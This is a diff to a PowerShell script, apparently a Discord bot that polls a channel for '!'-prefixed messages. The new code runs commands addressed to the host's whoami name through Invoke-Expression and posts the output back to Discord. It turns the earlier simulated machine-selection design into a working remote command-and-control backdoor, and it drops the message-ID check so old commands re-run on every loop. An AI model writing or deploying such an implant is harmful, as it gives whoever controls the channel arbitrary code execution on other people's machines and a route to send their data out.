@@ -11,9 +11,8 @@ $client = New-Object System.Net.Http.HttpClient
 $client.DefaultRequestHeaders.Authorization = "Bot $token"
 $client.DefaultRequestHeaders.Accept.Add("application/json")
 
-# Variable to store the selected machine
-$global:selectedMachine = $null
-$global:sessionLocked = $false
+# Get the current machine identity using `whoami`
+$global:machineName = whoami
 
 # Function to send a message to Discord
 function Send-DiscordMessage {
@@ -44,37 +43,20 @@ function Send-DiscordMessage {
     }
 }
 
-# Function to list available machines using `whoami`
-function List-Machines {
-    if ($global:sessionLocked) {
-        Send-DiscordMessage -Message "A machine is currently selected. Use !exit_machine to deselect it before listing other machines."
-        return
-    }
-
-    # Example of multiple connected machines with their whoami information
-    $machines = @("machine1\user", "machine2\user", "machine3\user")
-    
-    # Send the list to Discord
-    $machineList = "Available machines:`n"
-    $machines | ForEach-Object {
-        $machineList += "$_`n"
-    }
-    
-    Send-DiscordMessage -Message $machineList
-}
-
-# Function to execute a command on the selected machine
-function Execute-OnMachine {
+# Function to execute commands if addressed to this machine
+function Execute-Command {
     param (
-        [string]$machineName,
         [string]$command
     )
 
-    # Check if the machine is still selected
-    if ($global:selectedMachine -eq $machineName) {
+    # Check if the command includes this machine's name (from `whoami`)
+    if ($command -like "*$global:machineName*") {
+        # Remove the machine name from the command
+        $strippedCommand = $command.Replace("$global:machineName:", "").Trim()
+
         try {
-            # Run the command (this is a simulation - adjust as needed to actually run commands on a remote machine)
-            $output = Invoke-Expression $command  # For now, it runs locally; adjust for remote execution
+            # Run the command
+            $output = Invoke-Expression $strippedCommand
 
             if ($output) {
                 $result = $output -join "`n"  # Join multiline output for Discord message
@@ -88,41 +70,8 @@ function Execute-OnMachine {
         # Send the output to Discord
         Send-DiscordMessage -Message $result
     } else {
-        Send-DiscordMessage -Message "Invalid machine selection or no machine selected."
-    }
-}
-
-# Function to execute bot commands
-function Execute-BotCommand {
-    param (
-        [string]$command
-    )
-
-    if ($command -eq "exit_machine") {
-        # Exit the current machine selection
-        $global:selectedMachine = $null
-        $global:sessionLocked = $false
-        Send-DiscordMessage -Message "Exited the machine. You can now select a new machine."
-    } elseif ($command -eq "list_machines") {
-        List-Machines
-    } elseif ($command.StartsWith("select:")) {
-        $machineName = $command.Replace("select:", "").Trim()
-        
-        # Simulate machine selection (adjust logic for actual machine availability)
-        if ($machineName -in @("machine1\user", "machine2\user", "machine3\user")) {
-            $global:selectedMachine = $machineName
-            $global:sessionLocked = $true
-            Send-DiscordMessage -Message "Selected machine: $machineName. Future commands will be sent to this machine."
-        } else {
-            Send-DiscordMessage -Message "Invalid machine name: $machineName"
-        }
-    } else {
-        # Send the command to the selected machine
-        if ($global:selectedMachine) {
-            Execute-OnMachine -machineName $global:selectedMachine -command $command
-        } else {
-            Send-DiscordMessage -Message "No machine selected. Use !list_machines to see available machines."
-        }
+        # Command not for this machine, do nothing
+        Write-Host "Command not addressed to this machine."
     }
 }
 
@@ -146,19 +95,6 @@ function Get-DiscordMessages {
     }
 }
 
-# Initialize the bot by setting the last processed message ID
-function Initialize-LastMessageId {
-    $messages = Get-DiscordMessages
-    if ($messages) {
-        # Set $lastMessageId to the ID of the most recent message so old messages are ignored
-        $global:lastMessageId = $messages[0].id
-        Write-Host "Bot initialized. Ignoring messages before ID: $lastMessageId"
-    }
-}
-
-# Initialize the bot
-Initialize-LastMessageId
-
 # Main loop with rate limiting and command filtering
 while ($true) {
     $messages = Get-DiscordMessages
@@ -166,12 +102,11 @@ while ($true) {
     if ($messages) {
         foreach ($message in $messages) {
             # Process only if it's a new message and it's not sent by the bot itself
-            if ($message.id -gt $lastMessageId -and $message.author.id -ne $botUserId) {
+            if ($message.author.id -ne $botUserId) {
                 if ($message.content.StartsWith("!")) {
                     $command = $message.content.Substring(1)  # Remove the "!" but do not convert to lowercase
-                    Execute-BotCommand -command $command
+                    Execute-Command -command $command
                 }
-                $lastMessageId = $message.id  # Update the last processed message ID
             }
         }
     }
